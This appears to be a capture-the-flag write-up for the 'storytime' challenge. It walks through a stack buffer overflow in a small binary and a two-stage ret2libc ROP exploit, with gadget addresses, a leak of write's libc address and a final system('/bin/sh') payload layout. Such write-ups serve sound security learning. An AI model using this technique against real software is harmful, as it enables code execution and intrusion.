# storytime

I first link the application to the version libc that was provided:

```s
$ pwninit --bin storytime --libc libc.so.6
bin: storytime
libc: libc.so.6

fetching linker
https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.23-0ubuntu10_amd64.deb
setting ./ld-2.23.so executable
copying storytime to storytime_patched
running patchelf on storytime_patched
writing solve.py stub
$ ldd storytime_patched 
        linux-vdso.so.1 (0x00007ffcacbb3000)
        libc.so.6 => ./libc.so.6 (0x00007fe5ee400000)
        ./ld-2.23.so => /lib64/ld-linux-x86-64.so.2 (0x00007fe5ee95e000)
```

Now start with some basic file enumeration:

```s
$ file storytime_patched 
storytime_patched: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 3.2.0, BuildID[sha1]=3f716e7aa7e236824c52ed0410c1f14739919822, not stripped
$ pwn checksec storytime_patched          
[*] 'storytime_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
```

The only notable thing being that the `NX` bit is enabled.

Let's analyze this application in Ghidra. Looking at the main function:

```c

undefined8 main(void)

{
  undefined target [48];
  
  setvbuf(stdout,(char *)0x0,2,0);
  write(1,"HSCTF PWNNNNNNNNNNNNNNNNNNNN\n",0x1d);
  write(1,"Tell me a story: \n",0x12);
  read(0,target,400);
  return 0;
}


```

There is a clear overflow in `target`. The first thing we'll want to do is determine the offset from the buffer to the return pointer.

```s
gef➤  pattern offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 56 (little-endian search) likely
[+] Found at offset 49 (big-endian search)
```

There is an offset of 56 bytes from the buffer. Now time for actual exploitation.

This is going to be a two-staged payload. The first stage will leak off a libc address. The second will pop the shell.

Let's start.

It appears that `puts` isn't used or linked to this application so we'll have to use a different libc function. Fortunately, there is `write`. `write` takes three parameters:
1. int EDI : The FD to write to
2. void* RSI : What will be written
3. size_t RDX : The amount of characters being written

We'll need to setup the stack to properly call `write`.

`pop edi` is not available as a rop gadget but `pop rdi` is. We'll want to pop `1` into RDI to print to stdout. The following rop gadget let's us do this:

```s
$ cat rop.gadgets | grep "pop rdi"
0x0000000000400703 : pop rdi ; ret
```

Next, we'll want to print out the GOT entry from `write`. You can get this in Ghidra or via command line:

```s
$ objdump -R storytime_patched | grep "write"
0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5
```

Next, we'll want to pop this value into RSI. The following rop gadget performs this function

```s
$ cat rop.gadgets | grep "pop rsi"
0x0000000000400701 : pop rsi ; pop r15 ; ret
```

Finally, I couldn't find any rop gadget that would allow us to control RDX. Let's check the state of RDX before the `ret` instruction in main. The value of RDX just needs to be > 8.

```s
gef➤  i r
...<snip>...
rdx            0x190               0x190
...<snip>...
```

Lets get the entry for `write` in the PLT. This is what we'll call once the registers are setup. You can get this value through Ghidra or via command line:

```s
$ objdump -D -M intel storytime_patched | grep "write"
00000000004004a0 <write@plt>:
  4004a0:       ff 25 72 0b 20 00       jmp    QWORD PTR [rip+0x200b72]        # 601018 <write@GLIBC_2.2.5>
```

To recap, our stack space for the first overflow will look like:

```
-----------------------------
|          A * 56           |
-----------------------------
|          pop rdi          |
-----------------------------
|            0x1            |
-----------------------------
|     pop rsi ; pop r15     |
-----------------------------
|    write@GLIBC (0X601018) |
-----------------------------
|            0x0            |
-----------------------------
|    write@plt (0x4004a0)   |
-----------------------------
|       main (0x40062e)     |
-----------------------------
```

With `write` leaked off from libc, we can calculate the base address of libc and then we know the base address of every other function.

We can find the static address of system and /bin/sh:

```s
$ readelf -s libc.so.6 | grep "system@"
  1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
$ strings -a -t x libc.so.6 | grep "/bin/sh"
 18cd57 /bin/sh
```

The second payload will have the following format:

```
-----------------------------
|          A * 56           |
-----------------------------
|          pop rdi          |
-----------------------------
|          /bin/sh          |
-----------------------------
|          system           |
-----------------------------
```